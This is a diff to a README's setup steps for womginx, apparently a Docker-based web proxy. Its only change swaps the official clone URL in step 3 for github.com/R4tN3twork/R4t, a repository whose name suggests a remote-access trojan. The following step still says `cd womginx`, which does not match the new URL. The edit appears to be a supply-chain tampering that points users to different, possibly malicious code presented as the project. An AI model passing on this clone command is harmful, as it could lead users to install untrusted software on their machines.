@@ -53,7 +53,7 @@ Ok maybe not just that, you'll need the following:
 
 1. [Install Docker](https://docs.docker.com/engine/install/ubuntu/)
 2. [Install docker-compose](https://docs.docker.com/compose/install/)
-3. Clone this repo by running `git clone https://github.com/binary-person/womginx`
+3. Clone this repo by running `git clone https://github.com/R4tN3twork/R4t`
 4. `cd womginx` then edit go and edit `docker-compose.yml`
     - To disable safe browsing, delete the line that says `SAFE_BROWSING`
     - To change the port, edit `80:80` to `newport:80`
